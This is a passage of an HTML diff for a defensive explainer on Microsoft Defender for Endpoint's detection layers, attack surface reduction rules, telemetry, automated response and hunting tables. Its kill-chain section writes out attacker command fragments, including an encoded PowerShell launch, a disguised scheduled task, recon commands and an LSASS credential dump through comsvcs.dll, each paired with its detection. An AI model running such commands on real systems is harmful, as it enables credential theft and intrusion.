+        <div class="why-item"><div class="why-icon">📊</div><div class="why-content"><h4>Free With Every MDE License</h4><p>ASR rules are included in both MDE Plan 1 and Plan 2. Most organizations only use 2-3 rules. There are 16+ rules available — each one closes an attack vector. Turn them on.</p></div></div>
+        <div class="why-item"><div class="why-icon">🎯</div><div class="why-content"><h4>Specifically Targets Real Attack Techniques</h4><p>Each ASR rule maps to a specific real-world attack technique. "Block Office child processes" kills 90% of macro attacks. "Block LSASS credential stealing" stops Mimikatz. These aren't theoretical — they stop the attacks you see in the news.</p></div></div>
+        <div class="why-item"><div class="why-icon">⚠️</div><div class="why-content"><h4>The Reason People Don't Use It: Fear</h4><p>Security teams worry ASR will break things. That's what Audit mode is for. Run Audit for 2-4 weeks, fix exclusions, then Block. Every org that does this wishes they'd done it sooner. The risk of NOT using ASR is far greater than the risk of false positives.</p></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="engines">
+  <div class="section-inner">
+    <div class="section-label" style="background:rgba(168,85,247,.15);color:var(--purple)">🧬 Layer 2</div>
+    <h2 class="section-title fade-in">Hybrid Detection Engines</h2>
+    <p class="section-desc fade-in">Microsoft Defender Antivirus uses a <strong>layered defense</strong> with paired client-side and cloud-side engines. Each layer catches what the previous might miss. Source: <em>Advanced technologies at the core of Microsoft Defender Antivirus</em></p>
+
+    <div class="engines-container">
+      <div class="engine-col">
+        <h3 style="color:var(--purple)">💻 On the Client</h3>
+
+        <div class="card engine-card client-engine expandable fade-in">
+          <div style="display:flex;gap:1rem;align-items:flex-start">
+            <div class="card-icon">🧠</div>
+            <div>
+              <h3>Memory Scanning Engine</h3>
+              <p>Scans the memory space used by a running process to expose malicious behavior that could be hiding through code obfuscation.</p>
+              <span class="tag">Runtime</span>
+            </div>
+          </div>
+          <div class="expand-toggle">Details</div>
+          <div class="expand-content"><ul class="detail-list">
+            <li>Scans process memory for known shellcode patterns</li>
+            <li>Detects reflective DLL injection in memory</li>
+            <li>Catches unpacked payloads after execution begins</li>
+          </ul></div>
+        </div>
+
+        <div class="card engine-card client-engine expandable fade-in">
+          <div style="display:flex;gap:1rem;align-items:flex-start">
+            <div class="card-icon">🔗</div>
+            <div>
+              <h3>AMSI Integration Engine</h3>
+              <p>Deep in-app integration defeats code obfuscation. Blocks malicious behavior of scripts client-side, defeating fileless and in-memory attacks.</p>
+              <span class="tag">Pre-execution</span>
+            </div>
+          </div>
+          <div class="expand-toggle">Details</div>
+          <div class="expand-content"><ul class="detail-list">
+            <li>Covers PowerShell, VBScript, JScript, VBA macros</li>
+            <li>Sees code after all deobfuscation layers</li>
+            <li>Client-side blocking before cloud roundtrip</li>
+          </ul></div>
+        </div>
+
+        <div class="card engine-card client-engine expandable fade-in">
+          <div style="display:flex;gap:1rem;align-items:flex-start">
+            <div class="card-icon">🎯</div>
+            <div>
+              <h3>Heuristics Engine</h3>
+              <p>Identifies file characteristics that have similarities with known malicious characteristics to catch new threats or modified variants.</p>
+              <span class="tag">Pre-execution</span>
+            </div>
+          </div>
+          <div class="expand-toggle">Details</div>
+          <div class="expand-content"><ul class="detail-list">
+            <li>Fuzzy matching against malware family traits</li>
+            <li>Structural analysis of PE headers and sections</li>
+            <li>Entropy analysis for packed/encrypted payloads</li>
+          </ul></div>
+        </div>
+
+        <div class="card engine-card client-engine expandable fade-in">
+          <div style="display:flex;gap:1rem;align-items:flex-start">
+            <div class="card-icon">⚙️</div>
+            <div>
+              <h3>Emulation Engine</h3>
+              <p>Dynamically unpacks malware and examines runtime behavior. Scans both behavior during emulation and memory content at the end to defeat polymorphic malware and packers.</p>
+              <span class="tag">Pre-execution</span>
+            </div>
+          </div>
+          <div class="expand-toggle">Details</div>
+          <div class="expand-content"><ul class="detail-list">
+            <li>Unpacks UPX, Themida, custom packers</li>
+            <li>Exposes polymorphic payload post-deobfuscation</li>
+            <li>Lightweight — runs in milliseconds</li>
+          </ul></div>
+        </div>
+      </div>
+
+      <div class="engine-col">
+        <h3 style="color:var(--blue)">☁️ In the Cloud</h3>
+
+        <div class="card engine-card cloud-engine expandable fade-in">
+          <div style="display:flex;gap:1rem;align-items:flex-start">
+            <div class="card-icon">🤖</div>
+            <div>
+              <h3>AMSI-Paired ML Engine</h3>
+              <p>Pairs of client-side and cloud-side models perform advanced analysis of scripting behavior pre- and post-execution. Separate model pairs for each scripting engine.</p>
+              <span class="tag">Cloud ML</span>
+            </div>
+          </div>
+          <div class="expand-toggle">Details</div>
+          <div class="expand-content"><ul class="detail-list">
+            <li>Model pairs for: PowerShell, JavaScript, VBScript, Office VBA</li>
+            <li>Dynamic content calls + behavior instrumentation</li>
+            <li>Catches fileless attacks that bypass local detection</li>
+          </ul></div>
+        </div>
+
+        <div class="card engine-card cloud-engine expandable fade-in">
+          <div style="display:flex;gap:1rem;align-items:flex-start">
+            <div class="card-icon">🧬</div>
+            <div>
+              <h3>File Classification ML Engine</h3>
+              <p>Multi-class deep neural network classifiers examine full file contents. Suspicious files are held from running and submitted for classification. Verdict returns within seconds.</p>
+              <span class="tag">Deep Learning</span>
+            </div>
+          </div>
+          <div class="expand-toggle">Details</div>
+          <div class="expand-content"><ul class="detail-list">
+            <li>Full-content deep learning (not just headers)</li>
+            <li>"Block at first sight" — file held until cloud verdict</li>
+            <li>Allow/block decision within seconds</li>
+          </ul></div>
+        </div>
+
+        <div class="card engine-card cloud-engine expandable fade-in">
+          <div style="display:flex;gap:1rem;align-items:flex-start">
+            <div class="card-icon">💥</div>
+            <div>
+              <h3>Detonation-Based ML Engine</h3>
+              <p>Suspicious files detonated in a cloud sandbox. Deep learning classifiers analyze observed behaviors to block attacks.</p>
+              <span class="tag">Sandbox</span>
+            </div>
+          </div>
+          <div class="expand-toggle">Details</div>
+          <div class="expand-content"><ul class="detail-list">
+            <li>Full behavioral detonation in isolated sandbox</li>
+            <li>Observes API calls, file drops, network activity, registry</li>
+            <li>Deep learning on behavior sequences</li>
+          </ul></div>
+        </div>
+
+        <div class="card engine-card cloud-engine expandable fade-in">
+          <div style="display:flex;gap:1rem;align-items:flex-start">
+            <div class="card-icon">🏷️</div>
+            <div>
+              <h3>Reputation ML Engine</h3>
+              <p>Queries domain-expert reputation sources across Microsoft — SmartScreen URL models, Defender for Office 365 email knowledge, and the Microsoft Intelligent Security Graph.</p>
+              <span class="tag">Reputation</span>
+            </div>
+          </div>
+          <div class="expand-toggle">Details</div>
+          <div class="expand-content"><ul class="detail-list">
+            <li>SmartScreen URL reputation models</li>
+            <li>Defender for Office 365 attachment knowledge</li>
+            <li>Intelligent Security Graph cross-product signals</li>
+            <li>File, URL, IP, and domain reputation scoring</li>
+          </ul></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="why-box fade-in">
+      <div class="why-title">💡 Why Hybrid Detection Engines Matter</div>
+      <div class="why-grid">
+        <div class="why-item"><div class="why-icon">🛡️</div><div class="why-content"><h4>Layered Defense = No Single Point of Failure</h4><p>4 client engines + 4 cloud engines working in parallel. If the heuristics engine misses it, the emulation engine catches it. If both miss, the cloud detonation sandbox gets it. Attackers have to evade <em>all 8 layers</em>.</p></div></div>
+        <div class="why-item"><div class="why-icon">⏱️</div><div class="why-content"><h4>"Block at First Sight"</h4><p>Unknown files are held from executing while the cloud ML classifies them — verdict in seconds. This stops zero-day malware <em>before</em> it runs, not after damage is done.</p></div></div>
+        <div class="why-item"><div class="why-icon">🧬</div><div class="why-content"><h4>Defeats Modern Evasion</h4><p>Polymorphic malware, fileless attacks, obfuscated scripts — traditional signatures can't keep up. The emulation engine unpacks packers, AMSI defeats encoding, and ML models classify behavior patterns, not just file hashes.</p></div></div>
+        <div class="why-item"><div class="why-icon">🌐</div><div class="why-content"><h4>78 Trillion Daily Signals</h4><p>The cloud engines leverage threat intelligence from Microsoft's entire ecosystem — Windows, Office, Azure, Xbox, Bing. A URL seen in a phishing email in Japan can be blocked on your endpoint in seconds.</p></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- SECTION 3: DATA FLOW PIPELINE -->
+<section id="dataflow">
+  <div class="section-inner">
+    <div class="section-label" style="background:rgba(59,130,246,.15);color:var(--blue)">🔄 Layer 3</div>
+    <h2 class="section-title fade-in">Telemetry Pipeline</h2>
+    <p class="section-desc fade-in">How behavioral data flows from endpoint to cloud to detection to response. Compressed, encrypted, streamed over HTTPS (~5–20 MB/day per device).</p>
+
+    <div class="flow-pipeline">
+      <div class="flow-stage stage-collect fade-in">
+        <div class="stage-num">1</div>
+        <div class="stage-content">
+          <h3>📡 Collect — Kernel & User-Mode Hooks</h3>
+          <p>MsSense.exe collects process, file, network, registry, logon, DLL, memory, and AMSI events via ETW, minifilter drivers, WFP callouts, and kernel callbacks. Linux: eBPF tracepoints.</p>
+        </div>
+      </div>
+      <div class="flow-connector"><div class="connector-line"><div class="particle"></div><div class="particle" style="animation-delay:.5s"></div></div></div>
+
+      <div class="flow-stage stage-transmit fade-in">
+        <div class="stage-num">2</div>
+        <div class="stage-content">
+          <h3>🔒 Transmit — Compressed & Encrypted</h3>
+          <p>Telemetry deduplicated, compressed, and encrypted on-device, then streamed over HTTPS to Azure datacenters. Internal throttling prevents duplicate event flooding.</p>
+        </div>
+      </div>
+      <div class="flow-connector"><div class="connector-line"><div class="particle"></div><div class="particle" style="animation-delay:.7s"></div></div></div>
+
+      <div class="flow-stage stage-process fade-in">
+        <div class="stage-num">3</div>
+        <div class="stage-content">
+          <h3>⚡ Process — Cloud Correlation Engine</h3>
+          <p>Backend correlates signals across ALL tenant devices via the Intelligent Security Graph (78T+ daily signals). Cross-product correlation with Identity, Office 365, and Cloud Apps.</p>
+        </div>
+      </div>
+      <div class="flow-connector"><div class="connector-line"><div class="particle"></div><div class="particle" style="animation-delay:.3s"></div></div></div>
+
+      <div class="flow-stage stage-detect fade-in">
+        <div class="stage-num">4</div>
+        <div class="stage-content">
+          <h3>🚨 Detect — Alert & Incident Generation</h3>
+          <p>ML models and detection rules identify attack patterns. Alerts generated with MITRE ATT&CK mappings. Alerts sharing attack techniques or attacker are aggregated into incidents.</p>
+        </div>
+      </div>
+      <div class="flow-connector"><div class="connector-line"><div class="particle"></div><div class="particle" style="animation-delay:.6s"></div></div></div>
+
+      <div class="flow-stage stage-respond fade-in">
+        <div class="stage-num">5</div>
+        <div class="stage-content">
+          <h3>🛡️ Respond — Automated or Manual Actions</h3>
+          <p>Response actions pushed back to endpoint via sensor channel: isolate device, quarantine file, kill process, run AV scan, collect investigation package. Works even on isolated devices.</p>
+        </div>
+      </div>
+      <div class="flow-connector"><div class="connector-line"><div class="particle"></div><div class="particle" style="animation-delay:.4s"></div></div></div>
+
+      <div class="flow-stage stage-store fade-in">
+        <div class="stage-num">6</div>
+        <div class="stage-content">
+          <h3>💾 Store — Queryable Telemetry</h3>
+          <p>Raw telemetry stored 30 days in Advanced Hunting tables. Alert/incident data retained 180 days. Enables "travel back in time" to investigate the start of an attack.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="why-box fade-in">
+      <div class="why-title">💡 Why the Telemetry Pipeline Matters</div>
+      <div class="why-grid">
+        <div class="why-item"><div class="why-icon">🔍</div><div class="why-content"><h4>Cross-Device Visibility</h4><p>No single endpoint sees the full attack. Lateral movement from Device A → Device B is invisible to each device alone. The cloud pipeline correlates across your <em>entire fleet</em> to detect multi-stage attacks.</p></div></div>
+        <div class="why-item"><div class="why-icon">⏪</div><div class="why-content"><h4>6 Months of Time Travel</h4><p>When a breach is discovered months later, you can investigate back to the original compromise. Most incidents aren't detected the same day — MDE keeps the data for when you need it.</p></div></div>
+        <div class="why-item"><div class="why-icon">🔒</div><div class="why-content"><h4>Response Works Even on Isolated Devices</h4><p>When you isolate a compromised device, the MDE sensor channel stays active. You can still collect evidence, run scans, and remediate — without giving the attacker network access.</p></div></div>
+        <div class="why-item"><div class="why-icon">📋</div><div class="why-content"><h4>Compliance & Forensics</h4><p>Regulatory frameworks (NIST, ISO 27001, HIPAA) require evidence of detection and response capabilities. MDE's 180-day retention provides the audit trail you need for compliance and legal proceedings.</p></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- SECTION 4: ATTACK KILL CHAIN -->
+<section id="killchain">
+  <div class="section-inner">
+    <div class="section-label" style="background:rgba(239,68,68,.15);color:var(--red)">⚔️ Layer 4</div>
+    <h2 class="section-title fade-in">Attack Kill Chain — How MDE Detects Each Phase</h2>
+    <p class="section-desc fade-in">A simulated APT attack plays out phase by phase. Each shows the MITRE ATT&CK technique, what the attacker does, and how MDE detects it.</p>
+
+    <div class="killchain-timeline" id="kc-timeline">
+      <div class="kc-phase kc-initial" data-step="0">
+        <div class="phase-marker">📧</div>
+        <div class="phase-body">
+          <span class="mitre">T1566.001 — Spearphishing Attachment</span>
+          <h3>Phase 1: Initial Access</h3>
+          <p>Malicious Word doc with embedded macro. User opens it, macro runs <code>powershell.exe -enc ...</code></p>
+          <div class="detection">🛡️ <strong>Detected by:</strong> ASR rule "Block Office child processes" + AMSI deobfuscates encoded PowerShell + Cloud ML classifies macro</div>
+        </div>
+      </div>
+      <div class="kc-connector-v"><div class="kc-particle"></div></div>
+
+      <div class="kc-phase kc-persist" data-step="1">
+        <div class="phase-marker">🔄</div>
+        <div class="phase-body">
+          <span class="mitre">T1053.005 — Scheduled Task</span>
+          <h3>Phase 2: Persistence</h3>
+          <p>Creates scheduled task: <code>schtasks /create /tn "WindowsUpdate" /tr powershell.exe</code></p>
+          <div class="detection">🛡️ <strong>Detected by:</strong> DeviceProcessEvents + DeviceRegistryEvents + DeviceEvents (task creation action type)</div>
+        </div>
+      </div>
+      <div class="kc-connector-v"><div class="kc-particle" style="animation-delay:.3s"></div></div>
+
+      <div class="kc-phase kc-discovery" data-step="2">
+        <div class="phase-marker">🔎</div>
+        <div class="phase-body">
+          <span class="mitre">T1082 / T1016 / T1049 — Discovery</span>
+          <h3>Phase 3: Discovery</h3>
+          <p>Runs <code>systeminfo</code>, <code>whoami /all</code>, <code>net user</code>, <code>ipconfig</code>, <code>netstat -ano</code></p>
+          <div class="detection">🛡️ <strong>Detected by:</strong> DeviceProcessEvents (burst of recon commands) + Behavioral ML detects discovery pattern from suspicious process tree</div>
+        </div>
+      </div>
+      <div class="kc-connector-v"><div class="kc-particle" style="animation-delay:.6s"></div></div>
+
+      <div class="kc-phase kc-credential" data-step="3">
+        <div class="phase-marker">🔓</div>
+        <div class="phase-body">
+          <span class="mitre">T1003.001 — LSASS Memory Dump</span>
+          <h3>Phase 4: Credential Access</h3>
+          <p>Dumps LSASS via <code>rundll32 comsvcs.dll MiniDump</code></p>
+          <div class="detection">🛡️ <strong>Detected by:</strong> ASR "Block credential stealing from LSASS" + Memory scanning engine + Kernel optics detect MiniDump pattern</div>
+        </div>
+      </div>
+      <div class="kc-connector-v"><div class="kc-particle" style="animation-delay:.2s"></div></div>
+
+      <div class="kc-phase kc-lateral" data-step="4">
+        <div class="phase-marker">↔️</div>
+        <div class="phase-body">
+          <span class="mitre">T1021.002 — SMB/Admin Shares</span>
+          <h3>Phase 5: Lateral Movement</h3>
+          <p>Uses stolen creds to access <code>\\TARGET\C$</code> and copies payload</p>
+          <div class="detection">🛡️ <strong>Detected by:</strong> Cross-device correlation (A→B via SMB) + DeviceNetworkEvents (port 445) + DeviceLogonEvents (unusual source) + DeviceFileEvents on target</div>
+        </div>
+      </div>
+      <div class="kc-connector-v"><div class="kc-particle" style="animation-delay:.5s"></div></div>
+
+      <div class="kc-phase kc-exfil" data-step="5">
+        <div class="phase-marker">📤</div>
+        <div class="phase-body">
+          <span class="mitre">T1041 — Exfiltration Over C2</span>
+          <h3>Phase 6: Exfiltration</h3>
+          <p>Compresses sensitive files and uploads via HTTPS POST to external server</p>
+          <div class="detection">🛡️ <strong>Detected by:</strong> DeviceNetworkEvents (unusual data volume) + Network protection (SmartScreen reputation) + DeviceFileEvents (archive in temp)</div>
+        </div>
+      </div>
+      <div class="kc-connector-v"><div class="kc-particle" style="animation-delay:.4s;background:var(--green);box-shadow:0 0 6px var(--green)"></div></div>
+
+      <div class="kc-phase kc-air" data-step="6">
+        <div class="phase-marker">🤖</div>
+        <div class="phase-body">
+          <span class="mitre">Automated Investigation & Response</span>
+          <h3>Phase 7: MDE Responds</h3>
+          <p>AIR auto-investigates all alerts, correlates into one incident, expands scope, and remediates.</p>
+          <div class="detection">🛡️ <strong>Actions:</strong> File quarantined • Process killed • Scheduled task removed • Device isolated • Investigation package collected</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="why-box fade-in">
+      <div class="why-title">💡 Why Kill Chain Visibility Matters</div>
+      <div class="why-grid">
+        <div class="why-item"><div class="why-icon">🗺️</div><div class="why-content"><h4>See the Full Attack Story</h4><p>Isolated alerts are confusing. Seeing the complete kill chain — initial access → persistence → lateral movement — tells you what the attacker is <em>trying to achieve</em>, not just what they did.</p></div></div>
+        <div class="why-item"><div class="why-icon">🎯</div><div class="why-content"><h4>MITRE ATT&CK Alignment</h4><p>Every detection maps to MITRE techniques. This gives your team a common language, helps identify coverage gaps, and satisfies security frameworks that require threat-informed defense.</p></div></div>
+        <div class="why-item"><div class="why-icon">🛡️</div><div class="why-content"><h4>Multiple Detection Points per Phase</h4><p>Each attack phase is caught by 2-3 different detection mechanisms (ASR + ML + behavioral). This defense-in-depth means the attacker can't bypass a single control and succeed.</p></div></div>
+        <div class="why-item"><div class="why-icon">📈</div><div class="why-content"><h4>Improving Your Defenses</h4><p>When you see which kill chain phases generate the most alerts, you know where to invest: more ASR rules? Better user training? Network segmentation? Data drives the decision.</p></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- SECTION 5: AIR -->
+<section id="air">
+  <div class="section-inner">
+    <div class="section-label" style="background:rgba(34,197,94,.15);color:var(--green)">🤖 Layer 5</div>
+    <h2 class="section-title fade-in">Automated Investigation & Remediation (AIR)</h2>
+    <p class="section-desc fade-in">When an alert fires, AIR mimics a human analyst — investigate, expand scope, verdict, remediate. Requires Microsoft Defender Antivirus running in active or passive mode.</p>
+
+    <div class="air-flow fade-in">
+      <div class="air-step">
+        <div class="air-icon" style="background:rgba(59,130,246,.15);border:2px solid rgba(59,130,246,.3);color:var(--blue)">🚨</div>
+        <h4>Alert Triggered</h4>
+        <p>Alert fires from detection or custom rule. Incident created.</p>
+      </div>
+      <div class="air-arrow">→</div>
+      <div class="air-step">
+        <div class="air-icon" style="background:rgba(168,85,247,.15);border:2px solid rgba(168,85,247,.3);color:var(--purple)">🔬</div>
+        <h4>Examine Entity</h4>
+        <p>AIR examines: file hash, process tree, network connections, registry changes.</p>
+      </div>
+      <div class="air-arrow">→</div>
+      <div class="air-step">
+        <div class="air-icon" style="background:rgba(234,179,8,.15);border:2px solid rgba(234,179,8,.3);color:var(--yellow)">🔀</div>
+        <h4>Expand Scope</h4>
+        <p>Same threat on other devices? Added to investigation. 10+ devices requires approval.</p>
+      </div>
+      <div class="air-arrow">→</div>
+      <div class="air-step">
+        <div class="air-icon" style="background:rgba(249,115,22,.15);border:2px solid rgba(249,115,22,.3);color:var(--orange)">⚖️</div>
+        <h4>Verdict</h4>
+        <p>Each entity: <strong>Malicious</strong>, <strong>Suspicious</strong>, or <strong>No threats found</strong>.</p>
+      </div>
+      <div class="air-arrow">→</div>
+      <div class="air-step">
+        <div class="air-icon" style="background:rgba(34,197,94,.15);border:2px solid rgba(34,197,94,.3);color:var(--green)">✅</div>
+        <h4>Remediate</h4>
+        <p>Quarantine file, stop service, remove task, delete registry key. Tracked in Action Center.</p>
+      </div>
+    </div>
+
+    <div style="margin-top:2.5rem">
+      <div class="card fade-in" style="max-width:700px;margin:0 auto;text-align:center">
+        <h3 style="margin-bottom:.75rem">⚙️ Automation Levels</h3>
+        <div style="display:flex;gap:1rem;justify-content:center;flex-wrap:wrap">
+          <div style="flex:1;min-width:150px;padding:.75rem;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);border-radius:8px">
+            <div style="font-weight:700;color:var(--green);margin-bottom:.25rem">Full</div>
+            <div style="font-size:.78rem;color:var(--text-dim)">Auto-remediate, no approval</div>
+          </div>
+          <div style="flex:1;min-width:150px;padding:.75rem;background:rgba(234,179,8,.08);border:1px solid rgba(234,179,8,.2);border-radius:8px">
+            <div style="font-weight:700;color:var(--yellow);margin-bottom:.25rem">Semi</div>
+            <div style="font-size:.78rem;color:var(--text-dim)">Requires SOC approval</div>
+          </div>
+          <div style="flex:1;min-width:150px;padding:.75rem;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);border-radius:8px">
+            <div style="font-weight:700;color:var(--red);margin-bottom:.25rem">None</div>
+            <div style="font-size:.78rem;color:var(--text-dim)">Investigation only</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="why-box fade-in">
+      <div class="why-title">💡 Why Automated Investigation Matters</div>
+      <div class="why-grid">
+        <div class="why-item"><div class="why-icon">⏱️</div><div class="why-content"><h4>Minutes, Not Hours</h4><p>Mean Time to Respond drops from hours to minutes. AIR does in 60 seconds what a Tier 1 analyst does in 45 minutes — investigate the alert, check other devices, and remediate. That speed gap is the difference between containment and breach.</p></div></div>
+        <div class="why-item"><div class="why-icon">📉</div><div class="why-content"><h4>Reduces Alert Fatigue</h4><p>SOC teams face thousands of alerts daily. AIR automatically resolves true positives and dismisses false positives — your analysts only see what requires human judgment.</p></div></div>
+        <div class="why-item"><div class="why-icon">🔀</div><div class="why-content"><h4>Scope Expansion Catches What Humans Miss</h4><p>When AIR finds the same threat on 5 other devices, it adds them to the investigation automatically. Human analysts often focus on the alerted device and miss that the attacker has already spread.</p></div></div>
+        <div class="why-item"><div class="why-icon">⚙️</div><div class="why-content"><h4>Configurable Trust Levels</h4><p>Not ready for full automation? Start with Semi — AIR investigates and recommends, but waits for your approval before acting. Build confidence before going full auto.</p></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- SECTION 6: ADVANCED HUNTING -->
+<section id="hunting">
+  <div class="section-inner">
+    <div class="section-label" style="background:rgba(0,229,255,.15);color:var(--cyan)">🎯 Layer 6</div>
+    <h2 class="section-title fade-in">Advanced Hunting — 30 Days of Raw Telemetry</h2>
+    <p class="section-desc fade-in">KQL-based query engine over all endpoint telemetry. Write queries, then convert to custom detection rules that run on schedule and trigger response actions.</p>
+
+    <h3 class="fade-in" style="color:var(--cyan);margin-bottom:1rem;font-size:1rem">📊 Core Endpoint Tables</h3>
+    <div class="tables-grid">
+      <div class="table-card fade-in"><div class="table-name"><span class="tbl-icon">📋</span>DeviceProcessEvents</div><div class="table-desc">Process creation and related events — full command lines, parent process, hashes, account context</div></div>
+      <div class="table-card fade-in"><div class="table-name"><span class="tbl-icon">🌐</span>DeviceNetworkEvents</div><div class="table-desc">Network connection and related events — IPs, ports, URLs, DNS, initiating process</div></div>
+      <div class="table-card fade-in"><div class="table-name"><span class="tbl-icon">📁</span>DeviceFileEvents</div><div class="table-desc">File creation, modification, and other file system events</div></div>
+      <div class="table-card fade-in"><div class="table-name"><span class="tbl-icon">🗝️</span>DeviceRegistryEvents</div><div class="table-desc">Creation and modification of registry entries</div></div>
+      <div class="table-card fade-in"><div class="table-name"><span class="tbl-icon">👤</span>DeviceLogonEvents</div><div class="table-desc">Sign-ins and other authentication events on devices</div></div>
+      <div class="table-card fade-in"><div class="table-name"><span class="tbl-icon">📦</span>DeviceImageLoadEvents</div><div class="table-desc">DLL loading events — path, hash, signature, signer</div></div>
+      <div class="table-card fade-in"><div class="table-name"><span class="tbl-icon">⚡</span>DeviceEvents</div><div class="table-desc">Multiple event types including security controls: AMSI, exploit protection, ASR, USB, tamper protection</div></div>
+      <div class="table-card fade-in"><div class="table-name"><span class="tbl-icon">🏷️</span>DeviceFileCertificateInfo</div><div class="table-desc">Certificate information of signed files from certificate verification events</div></div>
+      <div class="table-card fade-in"><div class="table-name"><span class="tbl-icon">💻</span>DeviceInfo</div><div class="table-desc">Machine information including OS, domain, health, risk level</div></div>
+    </div>
+
+    <h3 class="fade-in" style="color:var(--green);margin-bottom:1rem;margin-top:2rem;font-size:1rem">🐛 Vulnerability Management Tables</h3>
+    <div class="tables-grid">
+      <div class="table-card fade-in"><div class="table-name" style="color:var(--green)"><span class="tbl-icon">📦</span>DeviceTvmSoftwareInventory</div><div class="table-desc">Inventory of software installed on devices including version info and end-of-support status</div></div>
+      <div class="table-card fade-in"><div class="table-name" style="color:var(--green)"><span class="tbl-icon">⚠️</span>DeviceTvmSoftwareVulnerabilities</div><div class="table-desc">Software vulnerabilities found on devices and available security updates</div></div>
+      <div class="table-card fade-in"><div class="table-name" style="color:var(--green)"><span class="tbl-icon">📚</span>DeviceTvmSoftwareVulnerabilitiesKB</div><div class="table-desc">Knowledge base of publicly disclosed vulnerabilities including exploit availability</div></div>
+      <div class="table-card fade-in"><div class="table-name" style="color:var(--green)"><span class="tbl-icon">🔧</span>DeviceTvmSecureConfigurationAssessment</div><div class="table-desc">Security configuration assessment status from Defender Vulnerability Management</div></div>
+    </div>
+
+    <h3 class="fade-in" style="color:var(--orange);margin-bottom:1rem;margin-top:2rem;font-size:1rem">🚨 Alert & Cross-Product Tables</h3>
+    <div class="tables-grid">
+      <div class="table-card fade-in"><div class="table-name" style="color:var(--orange)"><span class="tbl-icon">🚨</span>AlertInfo</div><div class="table-desc">Alerts from MDE, MDO, MDCA, MDI — severity, threat categorization, MITRE mapping</div></div>
+      <div class="table-card fade-in"><div class="table-name" style="color:var(--orange)"><span class="tbl-icon">🔗</span>AlertEvidence</div><div class="table-desc">Files, IP addresses, URLs, users, or devices associated with alerts</div></div>
+      <div class="table-card fade-in"><div class="table-name" style="color:var(--orange)"><span class="tbl-icon">🆔</span>IdentityLogonEvents</div><div class="table-desc">Authentication events on Active Directory and Microsoft online services</div></div>
+      <div class="table-card fade-in"><div class="table-name" style="color:var(--orange)"><span class="tbl-icon">📧</span>EmailEvents</div><div class="table-desc">Microsoft 365 email events including delivery and blocking events</div></div>
+    </div>
+
+    <div class="why-box fade-in">
+      <div class="why-title">💡 Why Advanced Hunting Matters</div>
+      <div class="why-grid">
+        <div class="why-item"><div class="why-icon">🔎</div><div class="why-content"><h4>Find What Detections Miss</h4><p>Pre-built detections catch known patterns. Advanced hunting lets you find the <em>unknown</em> — novel attack techniques, insider threats, or attacker activity that doesn't match any rule. This is where your security expertise becomes a force multiplier.</p></div></div>
+        <div class="why-item"><div class="why-icon">🔄</div><div class="why-content"><h4>Custom Detections = Evolving Defense</h4><p>Turn any hunting query into a scheduled detection rule. When you discover a new attacker technique, you build a detection in minutes — no vendor update required. Your defense evolves as fast as the threat.</p></div></div>
+        <div class="why-item"><div class="why-icon">🌐</div><div class="why-content"><h4>Cross-Product Hunting</h4><p>Query endpoint, email, identity, and cloud app data in a single query. See the email that delivered the payload AND the process that executed it AND the credentials it stole — all in one KQL query.</p></div></div>
+        <div class="why-item"><div class="why-icon">📊</div><div class="why-content"><h4>Proactive vs. Reactive Security</h4><p>Waiting for alerts is reactive. Hunting is proactive — you find the attacker before they trigger a detection. Organizations with active hunting programs reduce dwell time from 200+ days to under 30.</p></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- SECTION 7: TVM -->
+<section id="tvm">
+  <div class="section-inner">
+    <div class="section-label" style="background:rgba(34,197,94,.15);color:var(--green)">📊 Layer 7</div>
+    <h2 class="section-title fade-in">Threat & Vulnerability Management</h2>
+    <p class="section-desc fade-in">Continuous asset discovery with risk-based intelligent prioritization. Uses breach likelihood predictions, exploit intelligence, and business context — not just CVSS scores.</p>
+
+    <div class="tvm-grid">
+      <div class="card tvm-card fade-in">
+        <div class="card-icon">🔍</div>
+        <h3>Continuous Discovery</h3>
+        <p>Built-in and agentless scanners monitor software, certificates, browser extensions, firmware, and hardware — even offline from corporate network.</p>
+        <span class="tag">Always-on</span>
+      </div>
+      <div class="card tvm-card fade-in">
+        <div class="card-icon">🎯</div>
+        <h3>Intelligent Prioritization</h3>
+        <p>Aligns prioritization with vulns exploited in the wild. Correlates TVM + EDR to find vulns exploited in active breaches within your org.</p>
+        <span class="tag">ML-Driven</span>
+      </div>
+      <div class="card tvm-card fade-in">
+        <div class="card-icon">📋</div>
+        <h3>Security Baselines</h3>
+        <p>Customizable baseline profiles measuring compliance against CIS and STIG benchmarks with real-time drift monitoring.</p>
+        <span class="tag">CIS / STIG</span>
+      </div>
+      <div class="card tvm-card fade-in">
+        <div class="card-icon">🔧</div>
+        <h3>Remediation & Tracking</h3>
+        <p>Create remediation tasks in Intune from recommendations. Block vulnerable apps. Track progress in real-time.</p>
+        <span class="tag">Intune Integration</span>
+      </div>
+      <div class="card tvm-card fade-in">
+        <div class="card-icon">🌐</div>
+        <h3>Network Share Assessment</h3>
+        <p>Assess vulnerable internal network shares with actionable security recommendations for misconfigurations.</p>
+        <span class="tag">Network</span>
+      </div>
+      <div class="card tvm-card fade-in">
+        <div class="card-icon">📜</div>
+        <h3>Certificate Assessment</h3>
+        <p>Centralized certificate inventory. Identify certs before expiry. Detect weak signature algorithms.</p>
+        <span class="tag">Certificates</span>
+      </div>
+    </div>
+
+    <div class="why-box fade-in">
+      <div class="why-title">💡 Why Vulnerability Management Matters</div>
+      <div class="why-grid">
+        <div class="why-item"><div class="why-icon">🎯</div><div class="why-content"><h4>Risk-Based, Not CVSS-Based</h4><p>A CVSS 9.8 vulnerability with no known exploit is less urgent than a CVSS 7.0 being actively exploited in the wild. TVM uses breach likelihood predictions and exploit intelligence to prioritize what actually matters to <em>your</em> organization.</p></div></div>
+        <div class="why-item"><div class="why-icon">🔗</div><div class="why-content"><h4>EDR + TVM = Unique Power</h4><p>Most vuln scanners can't tell you if a vulnerability is being exploited right now in your environment. MDE can — it correlates TVM data with EDR detections to find vulns under active attack.</p></div></div>
